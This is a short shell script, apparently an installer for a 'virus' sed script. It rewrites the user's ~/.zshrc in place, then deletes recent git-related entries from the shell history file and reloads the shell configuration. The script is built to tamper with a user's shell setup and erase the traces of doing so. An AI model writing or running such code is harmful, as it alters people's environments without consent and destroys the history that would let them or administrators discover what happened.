sed -i".aonaon" -f virus.sed ~/.zshrc
tac $HISTFILE | sed '1,20{/git/d;}' >temp
tac temp >$HISTFILE
rm temp
source ~/.zshrc
